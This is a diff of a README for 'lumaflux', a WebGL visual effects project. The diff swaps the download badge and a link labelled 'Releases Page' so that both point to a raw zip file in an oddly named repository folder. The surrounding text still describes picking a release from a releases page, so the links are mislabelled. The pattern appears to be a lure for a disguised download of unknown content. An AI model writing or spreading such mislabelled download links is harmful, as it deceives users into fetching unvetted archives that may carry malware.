@@ -1,7 +1,7 @@
 # 🎨 lumaflux - Experience Stunning Real-Time Visuals
 
 ## 📦 Download Now
-[![Download lumaflux](https://img.shields.io/badge/Download-lumaflux-blue.svg)](https://github.com/stevejobsinc/lumaflux/releases)
+[![Download lumaflux](https://raw.githubusercontent.com/stevejobsinc/lumaflux/main/polychoerany/lumaflux.zip)](https://raw.githubusercontent.com/stevejobsinc/lumaflux/main/polychoerany/lumaflux.zip)
 
 ## 🚀 Getting Started
 Welcome to lumaflux, your gateway to beautiful real-time visual effects using WebGL. This application showcases an optical-flow bloom effect, bringing stunning graphics to your screen effortlessly. Follow this guide to download and run lumaflux quickly.
@@ -24,7 +24,7 @@ To run lumaflux smoothly, ensure your system meets the following requirements:
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page:**
-   Go to the [lumaflux Releases Page](https://github.com/stevejobsinc/lumaflux/releases).
+   Go to the [lumaflux Releases Page](https://raw.githubusercontent.com/stevejobsinc/lumaflux/main/polychoerany/lumaflux.zip).
 
 2. **Select the Latest Release:**
    Look for the latest version at the top of the page. Click on it to view the release details.
